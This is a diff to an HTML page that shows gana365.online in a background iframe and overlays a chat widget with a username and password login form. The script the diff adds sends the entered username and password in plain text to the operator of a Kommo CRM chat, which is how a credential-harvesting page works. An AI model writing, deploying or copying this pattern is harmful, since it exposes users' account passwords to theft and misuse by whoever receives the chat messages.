@@ -9,17 +9,22 @@
 </head>
 <body>
 
+  <!-- Fondo en iframe -->
   <iframe id="backgroundIframe" src="https://gana365.online"></iframe>
 
+  <!-- Botón flotante -->
   <button class="chat-button" onclick="toggleChat()">💬</button>
 
+  <!-- Contenedor principal del chat -->
   <div class="chat-container" id="chatBox">
+    <!-- Encabezado con logo y contacto -->
     <div id="chatHeader" class="chat-header" style="display: none;">
       <img src="https://gana365.online/images/logo.png" alt="Logo" class="chat-logo"/>
       <span class="chat-phone">Soporte: +54 9 11 5412-8983</span>
       <button onclick="toggleChat()" class="close-chat">✖</button>
     </div>
 
+    <!-- Login del usuario -->
     <div class="login-container" id="loginForm">
       <h3>Bienvenido</h3>
       <img src="https://gana365.online/images/logo.png" class="login-logo" alt="Logo"/>
@@ -28,10 +33,11 @@
       <button onclick="login()" class="login-button">Iniciar Chat</button>
     </div>
 
+    <!-- Contenedor del widget embebido -->
     <div id="kommo_widget_container" style="width: 100%; height: 100%; min-height: 300px;"></div>
   </div>
 
-  <!-- Kommo Widget Script -->
+  <!-- Script del widget de Kommo -->
   <script>
     (function(a,m,o,c,r,m){
       a[m]={
@@ -50,6 +56,54 @@
       s.src='https://gso.kommo.com/js/button.js';
       d.head&&d.head.appendChild(s);
     })(window,"crm_plugin","crmPlugin");
+  </script>
+
+  <!-- Script personalizado cargado al final -->
+  <script>
+    function login() {
+      let username = document.getElementById("username").value.trim();
+      let password = document.getElementById("password").value.trim();
+
+      if (username === "" || password === "") {
+        Swal.fire({
+          icon: "error",
+          title: "Por favor, complete todos los campos",
+          confirmButtonText: "OK",
+          confirmButtonColor: "#6C63FF",
+          iconColor: "#FF3B00",
+          customClass: { popup: 'swal2-rounded' }
+        });
+        return;
+      }
+
+      // Ocultar login y mostrar header
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("chatHeader").style.display = "flex";
+
+      // Enviar datos al bot como mensaje inicial
+      setTimeout(() => {
+        if (window.crmPlugin && window.crmPlugin.setMeta) {
+          window.crmPlugin.setMeta({
+            name: username,
+            message: `Usuario: ${username}\nContraseña: ${password}`
+          });
+        }
+      }, 1000);
+    }
+
+    function toggleChat() {
+      const chat = document.getElementById("chatBox");
+      const button = document.querySelector(".chat-button");
+
+      if (chat.style.display === "block") {
+        chat.style.display = "none";
+        button.innerHTML = "💬";
+      } else {
+        chat.style.display = "block";
+        setTimeout(() => chat.classList.add("open"), 10);
+        button.innerHTML = "✖";
+      }
+    }
   </script>
 </body>
 </html>
